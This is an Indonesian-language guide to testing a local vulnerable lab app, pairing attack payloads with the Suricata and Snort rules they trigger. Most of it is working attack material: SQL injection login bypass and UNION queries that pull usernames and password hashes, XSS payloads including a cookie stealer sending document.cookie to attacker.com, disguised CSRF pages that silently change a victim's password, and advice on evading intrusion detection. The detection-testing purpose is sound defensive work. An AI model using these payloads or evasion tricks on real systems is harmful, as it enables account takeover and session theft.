# 🔥 Payload Testing Guide - Sistem Arsip Surat

Panduan lengkap payload untuk testing SQLi, XSS, dan CSRF yang sesuai dengan Suricata/Snort rules.

---

## 📋 Pre-requisites

1. Login dulu dengan credentials:
   - Username: `admin`
   - Password: `admin123`

2. Pastikan Docker running:
   ```bash
   docker-compose ps
   ```

---

## 🔴 SQL INJECTION PAYLOADS

### 1. Login Bypass (SQLi di Login Form)

**Target:** `http://localhost:8000/login.php` atau `http://localhost:8000/login_id.php`

**Payload untuk Username field:**
```
admin' OR '1'='1
```

**Payload untuk Password field:**
```
anything
```

**Rules yang akan triggered:**
- ✅ Suricata SID: 100004 (Single Quote - Body)
- ✅ Suricata SID: 100006 (1=1 - Body)
- ✅ Snort3 SID: 300005 (Single Quote - POST)
- ✅ Snort3 SID: 300006 (OR 1=1 - POST)

**Expected Result:** Login berhasil bypass tanpa password yang benar

---

### 2. Pencarian Surat - Basic SQLi Test

**Target:** `http://localhost:8000/sqli.php` atau `http://localhost:8000/sqli_id.php`

**Payload 1: Show All Records (dengan # comment)**
```
1' OR '1'='1' #
```

**Payload 2: Show All Records (dengan -- comment)**
```
1' OR '1'='1' -- -
```

**Payload 3: Alternative (tanpa comment)**
```
1' OR 'x'='x
```

**Rules yang akan triggered:**
- ✅ Suricata SID: 100003 (Single Quote - URI)
- ✅ Suricata SID: 100005 (1=1 - URI)
- ✅ Suricata SID: 100007 (SQL Comment --)
- ✅ Snort3 SID: 300002 (Single Quote - GET)
- ✅ Snort3 SID: 300003 (OR 1=1 - GET)

**Expected Result:** Menampilkan semua surat tanpa SQL error

---

### 3. UNION-based SQLi - Extract Database Info

**Target:** `http://localhost:8000/sqli.php`

**Payload 1: Test Column Count**
```
1' UNION SELECT 1,2,3,4 #
```

**Payload 2: Extract Usernames & Passwords**
```
1' UNION SELECT username,password,3,created_at FROM users #
```

**Payload 3: Extract Database Version**
```
1' UNION SELECT 1,VERSION(),3,4 #
```

**Payload 4: Extract Database Name**
```
1' UNION SELECT 1,DATABASE(),3,4 #
```

**Note:** Gunakan `#` untuk comment di MySQL. Alternatif lain: `-- -` (dengan spasi dan dash tambahan) atau `--+` (URL encoded)

**Rules yang akan triggered:**
- ✅ Suricata SID: 100001 (UNION SELECT - URI)
- ✅ Suricata SID: 100003 (Single Quote - URI)
- ✅ Suricata SID: 100007 (SQL Comment --)
- ✅ Snort3 SID: 300001 (UNION SELECT - GET)
- ✅ Snort3 SID: 300002 (Single Quote - GET)

**Expected Result:** Menampilkan data dari tabel users (username dan MD5 password hash)

---

### 4. Blind SQLi - Time-based

**Target:** `http://localhost:8000/sqli.php`

**Payload: Delay 5 seconds**
```
1' AND SLEEP(5) #
```

**Alternative dengan -- comment:**
```
1' AND SLEEP(5) -- -
```

**Rules yang akan triggered:**
- ✅ Suricata SID: 100003 (Single Quote - URI)
- ✅ Suricata SID: 100007 (SQL Comment --)
- ✅ Snort3 SID: 300002 (Single Quote - GET)

**Expected Result:** Response tertunda 5 detik

---

## 💉 XSS (CROSS-SITE SCRIPTING) PAYLOADS

### 1. Reflected XSS - Feedback Sistem

**Target:** `http://localhost:8000/xss_reflected.php` atau `http://localhost:8000/xss_reflected_id.php`

**Payload 1: Basic Script Tag**
```
<script>alert('XSS')</script>
```

**URL Encoded untuk GET:**
```
http://localhost:8000/xss_reflected.php?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

**Payload 2: IMG Tag with onerror**
```
<img src=x onerror="alert('XSS')">
```

**Payload 3: SVG with onload**
```
<svg onload="alert('XSS')">
```

**Payload 4: Cookie Stealer**
```
<img src=x onerror="alert(document.cookie)">
```

**Rules yang akan triggered:**
- ✅ Suricata SID: 100010 (Script Tag - URI)
- ✅ Suricata SID: 100012 (Event Handler onerror - URI)
- ✅ Suricata SID: 100014 (Alert Function - URI)
- ✅ Snort3 SID: 300010 (Script Tag - GET)
- ✅ Snort3 SID: 300011 (onerror - GET)

**Expected Result:** JavaScript akan dieksekusi di browser, muncul alert popup

---

### 2. Stored XSS - Komentar Surat

**Target:** `http://localhost:8000/xss_stored.php` atau `http://localhost:8000/xss_stored_id.php`

**Payload 1: Basic Alert**
```
<script>alert('Stored XSS')</script>
```

**Payload 2: Persistent Cookie Stealer**
```
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

**Payload 3: SVG Payload**
```
<svg onload="alert('Stored XSS Executed!')">
```

**Payload 4: Auto-redirect**
```
<script>document.location='http://evil.com'</script>
```

**Rules yang akan triggered:**
- ✅ Suricata SID: 100011 (Script Tag - Body)
- ✅ Suricata SID: 100013 (Event Handler onerror - Body)
- ✅ Suricata SID: 100015 (Alert Function - Body)
- ✅ Snort3 SID: 300012 (Script Tag - POST)
- ✅ Snort3 SID: 300013 (onerror - POST)

**Expected Result:** 
- Payload tersimpan di database
- Setiap user yang membuka halaman komentar akan terkena XSS
- Gunakan tombol "🔄 Reset Komentar" untuk membersihkan payload

---

## 🎯 CSRF (CROSS-SITE REQUEST FORGERY) PAYLOADS

### 1. CSRF Attack - Ganti Password via Form Submission

**Target:** `http://localhost:8000/csrf.php` atau `http://localhost:8000/csrf_id.php`

**Step 1: Create malicious HTML file** (`csrf_attack.html`):

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Loading your prize...</h1>
    
    <!-- Hidden form that auto-submits -->
    <form id="csrf_form" action="http://localhost:8000/csrf.php" method="POST" style="display:none;">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    
    <script>
        // Auto-submit form saat halaman dimuat
        document.getElementById('csrf_form').submit();
    </script>
</body>
</html>
```

**Step 2: Victim yang sudah login membuka file HTML tersebut**

**Rules yang akan triggered:**
- ✅ Suricata SID: 100021 (Password change without token - Body)
- ✅ Snort3 SID: 300021 (Password change without token - POST)

**Expected Result:** Password berubah menjadi `hacked123` tanpa sepengetahuan user

---

### 2. CSRF Attack via iframe (Silent Attack)

**Create file** (`csrf_iframe.html`):

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cute Cat Photos</title>
</head>
<body>
    <h1>Check out these cute cats!</h1>
    <img src="https://placekitten.com/400/300" alt="Cute cat">
    
    <!-- Hidden iframe yang mengirim CSRF attack -->
    <iframe style="display:none;" name="csrf_frame"></iframe>
    
    <form id="csrf_form" action="http://localhost:8000/csrf.php" method="POST" target="csrf_frame" style="display:none;">
        <input type="hidden" name="new_password" value="pwned456">
        <input type="hidden" name="confirm_password" value="pwned456">
    </form>
    
    <script>
        // Submit form ke hidden iframe
        setTimeout(function() {
            document.getElementById('csrf_form').submit();
        }, 1000);
    </script>
</body>
</html>
```

**Expected Result:** 
- User hanya melihat gambar kucing
- Di background, password berubah tanpa disadari
- Tidak ada redirect atau tanda-tanda aneh

---

### 3. CSRF Attack via Image Tag (GET-based variant)

**Note:** Aplikasi kita pakai POST, tapi ini contoh jika endpoint vulnerable via GET:

```html
<img src="http://localhost:8000/csrf.php?new_password=hacked789&confirm_password=hacked789" style="display:none;">
```

---

## 🧪 Testing Workflow

### Testing SQLi:
1. Buka browser → `http://localhost:8000/login.php`
2. Masukkan payload SQLi di username field
3. Submit form
4. Cek Suricata/Snort log untuk alert
5. Cek aplikasi: apakah login berhasil atau muncul data?

### Testing XSS:
1. Buka browser → `http://localhost:8000/xss_reflected.php?name=<payload>`
2. Atau post payload ke `http://localhost:8000/xss_stored.php`
3. Cek Suricata/Snort log untuk alert
4. Cek browser: apakah alert popup muncul?

### Testing CSRF:
1. Login sebagai admin di `http://localhost:8000/login.php`
2. Buka file HTML attack (`csrf_attack.html`) di browser yang sama
3. Cek Suricata/Snort log untuk alert
4. Coba login lagi dengan password lama → gagal
5. Login dengan password baru (`hacked123`) → berhasil

---

## 📊 Rules Mapping

| Attack Type | Payload | Suricata Rules | Snort3 Rules |
|-------------|---------|----------------|--------------|
| SQLi Login | `admin' OR '1'='1` | 100004, 100006 | 300005, 300006 |
| SQLi UNION | `1' UNION SELECT ...` | 100001, 100003, 100007 | 300001, 300002 |
| XSS Reflected | `<script>alert('XSS')</script>` | 100010, 100014 | 300010 |
| XSS Stored | `<img src=x onerror="alert()">` | 100011, 100013, 100015 | 300012, 300013 |
| CSRF | POST without token | 100021 | 300021 |

---

## 🔧 Troubleshooting

### SQL Error muncul:
- Pastikan payload pakai single quote (`'`) di awal dan akhir
- Untuk UNION, pastikan jumlah kolom = 4
- Gunakan `--` untuk comment out sisa query

### XSS tidak jalan:
- Cek apakah payload ter-encode di URL
- Pastikan tidak ada content security policy yang blocking
- Gunakan browser tanpa XSS auditor (Chrome sudah remove fitur ini)

### CSRF tidak jalan:
- Pastikan victim sudah login sebagai admin
- Buka HTML attack file dari localhost atau file:// protocol
- Cek apakah cookie session masih valid

---

## 🎓 Next Steps: Evasion Techniques

Setelah payload dasar berhasil, coba teknik evasion:

### SQLi Evasion:
- Case mixing: `UnIoN sElEcT`
- Comment insertion: `UN/**/ION SE/**/LECT`
- URL encoding: `%55NION%20%53ELECT`
- Hex encoding: `0x554E494F4E`

### XSS Evasion:
- Case mixing: `<ScRiPt>aLeRt(1)</sCrIpT>`
- Event variation: `onload`, `onerror`, `onmouseover`
- Tag variation: `<svg>`, `<iframe>`, `<embed>`
- JS obfuscation: `eval(atob('YWxlcnQoMSk='))`

### CSRF Evasion:
- Change parameter names slightly
- Add decoy parameters
- Use different HTTP methods (if app accepts)

---

**Happy Hacking! 🔥**
